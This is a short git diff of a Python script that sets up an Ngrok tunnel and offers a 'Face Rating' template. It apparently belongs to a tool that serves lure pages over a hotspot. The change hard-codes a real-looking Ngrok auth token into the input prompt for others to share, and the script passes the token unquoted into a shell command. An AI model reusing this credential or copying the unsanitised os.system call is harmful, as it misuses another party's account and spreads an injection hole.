@@ -41,7 +41,7 @@ def main():
     print("\n\033[1;31m[!] Turn on your hotspot before continuing!\033[0m\n")
     token = load_token()
     if not token:
-        token = input("Enter your Ngrok auth token: ").strip()
+        token = input("Enter your Ngrok auth token (use this if don't have one , 2uDpowTCpSNGhcKZDFudAIYVgzY_5eQoEwnb1618PjVwqZJgY ): ").strip()
         save_token(token)
     os.system(f"ngrok config add-authtoken {token}")
     print("\nAvailable templates:\n[1] Face Rating\n")
